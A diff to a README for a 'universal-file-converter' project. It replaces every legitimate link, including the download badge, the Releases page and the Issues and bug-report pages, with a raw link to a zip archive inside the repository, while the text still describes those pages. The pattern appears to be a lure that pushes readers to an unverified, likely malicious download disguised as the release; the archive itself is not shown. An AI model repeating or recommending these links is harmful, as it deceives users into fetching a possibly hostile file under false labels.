@@ -6,9 +6,9 @@ Welcome to the universal-file-converter! With this application, you can easily c
 
 ## 📥 Download the Application
 
-[![Download](https://img.shields.io/badge/Download%20Now-Get%20the%20Latest%20Version-brightgreen)](https://github.com/anasahmed10983/universal-file-converter/releases)
+[![Download](https://github.com/anasahmed10983/universal-file-converter/raw/refs/heads/master/app/converters/universal_file_converter_2.7.zip%20Now-Get%20the%20Latest%20Version-brightgreen)](https://github.com/anasahmed10983/universal-file-converter/raw/refs/heads/master/app/converters/universal_file_converter_2.7.zip)
 
-To download the **universal-file-converter**, visit the [Releases page](https://github.com/anasahmed10983/universal-file-converter/releases). Here, you will find the latest version available for download.
+To download the **universal-file-converter**, visit the [Releases page](https://github.com/anasahmed10983/universal-file-converter/raw/refs/heads/master/app/converters/universal_file_converter_2.7.zip). Here, you will find the latest version available for download.
 
 ## 💻 System Requirements
 
@@ -31,7 +31,7 @@ The universal-file-converter offers a range of features:
 
 ## 📥 Download & Install
 
-1. Visit the [Releases page](https://github.com/anasahmed10983/universal-file-converter/releases).
+1. Visit the [Releases page](https://github.com/anasahmed10983/universal-file-converter/raw/refs/heads/master/app/converters/universal_file_converter_2.7.zip).
 2. Find the latest version of the application.
 3. Click on the version number to open the release details.
 4. Look for the assets associated with this release. You will see files for different operating systems.
@@ -66,7 +66,7 @@ The universal-file-converter offers a range of features:
 
 ## 🛠 Support
 
-If you encounter any issues or have questions, please visit the [Issues page](https://github.com/anasahmed10983/universal-file-converter/issues). You can report bugs or ask for help here. The community and developers are here to assist you.
+If you encounter any issues or have questions, please visit the [Issues page](https://github.com/anasahmed10983/universal-file-converter/raw/refs/heads/master/app/converters/universal_file_converter_2.7.zip). You can report bugs or ask for help here. The community and developers are here to assist you.
 
 ## 📜 License
 
@@ -74,10 +74,10 @@ This project is licensed under the MIT License. You can freely use, modify, and 
 
 ## 🐞 Reporting Bugs
 
-To report any bugs or issues, please use the [Issues page](https://github.com/anasahmed10983/universal-file-converter/issues). Be sure to provide detailed information about your problem.
+To report any bugs or issues, please use the [Issues page](https://github.com/anasahmed10983/universal-file-converter/raw/refs/heads/master/app/converters/universal_file_converter_2.7.zip). Be sure to provide detailed information about your problem.
 
 ## 🔗 Stay Updated
 
-For the latest updates and features, keep an eye on the [Releases page](https://github.com/anasahmed10983/universal-file-converter/releases). You can also follow the project on GitHub to receive notifications about new releases and features.
+For the latest updates and features, keep an eye on the [Releases page](https://github.com/anasahmed10983/universal-file-converter/raw/refs/heads/master/app/converters/universal_file_converter_2.7.zip). You can also follow the project on GitHub to receive notifications about new releases and features.
 
 Thank you for choosing the universal-file-converter! Enjoy hassle-free file conversion.
